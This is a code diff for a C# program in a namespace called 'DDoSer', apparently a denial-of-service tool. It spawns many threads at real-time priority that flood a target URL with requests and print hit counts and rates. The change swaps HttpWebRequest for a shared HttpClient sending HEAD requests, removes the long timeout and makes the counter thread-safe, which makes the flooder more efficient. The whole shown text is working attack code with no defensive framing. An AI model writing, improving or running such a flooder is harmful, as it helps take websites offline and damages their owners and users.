@@ -1,6 +1,6 @@
 ﻿using System;
 using System.Diagnostics;
-using System.Net;
+using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Timers;
@@ -13,7 +13,6 @@ namespace DDoSer
         private static int countElapsed = 0;
         private static int speed = 0;
         private static readonly int timerInterval = 1000;
-        private static int requestTimeoutInSec = 3600;
 
 
         private static void Main()
@@ -36,6 +35,8 @@ namespace DDoSer
             {
                 p.PriorityClass = ProcessPriorityClass.RealTime;
             }
+            
+            HttpClient httpClient = new();
 
             Thread[] threads = new Thread[numOfThreads];
 
@@ -48,11 +49,13 @@ namespace DDoSer
                     {
                         try
                         {
-                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
-                            request.UserAgent = userAgent;
-                            request.Timeout = 1000 * requestTimeoutInSec;
-                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-                            ++count;
+                            using (HttpRequestMessage request = new(HttpMethod.Head, url))
+                            {
+                                request.Headers.Add("User-Agent", userAgent);
+                                HttpResponseMessage response = httpClient.Send(request, CancellationToken.None);
+                                response.EnsureSuccessStatusCode();
+                                Interlocked.Increment(ref count);
+                            }
                             Console.WriteLine($"Hitted: {count}\tSpeed: {speed}/sec");
                         }
                         catch (Exception e)
